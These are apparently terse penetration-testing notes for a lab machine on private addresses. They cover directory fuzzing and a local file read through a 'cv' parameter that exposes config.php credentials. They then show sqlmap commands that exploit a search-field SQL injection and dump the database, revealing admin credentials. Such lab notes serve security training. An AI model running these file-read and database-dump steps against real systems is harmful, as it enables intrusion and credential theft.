Attackbox
`10.129.72.154`

Target
`10.129.136.60`
`http://10.129.136.60`

**`/file.php?cv=...`**
`gobuster fuzz -u http://10.129.136.60:80/file.php?cv=FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20`

nmap -sV
**Apache httpd 2.4.41**

`gobuster dir -u http://10.129.136.60:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x bak,txt,html,php -t 20`
- 200
	- index.php
	- sitemap.xml
	- api.php
	- config.php
	- file.php
- 301
	- mail --> mail.log
	- phpmyadmin --> credentials required
	- javascript
	- assets
	- dashboard.php
	- logout.php
- 403 (forbidden)
	- .htpasswd
	- .htpasswd.txt
	- .htpasswd.bak
	- ...

Finding in /mail
mail.log
HR credential (username: hr) in `config.php`
`http://10.129.136.60/file.php?cv=file://config.php`
hr:hrpassword123

Admin credentials in backend database
--> try SQLi once logged in
search='
--> sql error message --> vulnerable
capture request with burp, save it to txt file, use as request template for sqlmap
`sqlmap -r request.txt -p search --dbs`
--> recruit_db
--> `sqlmap -r request.txt -p search -D recruit_db --tables`
- candidates, users
--> `sqlmap -r request.txt -p search -D recruit_db -T users --columns`
- id, password, username
--> `sqlmap -r request.txt -D recruit_db --dump-all`
- admin:admin@001admin


CVE
- Apache 2.4.41
https://www.exploit-db.com/exploits/51193: inconclusive


- phpmyadmin, version 4.9.5deb2

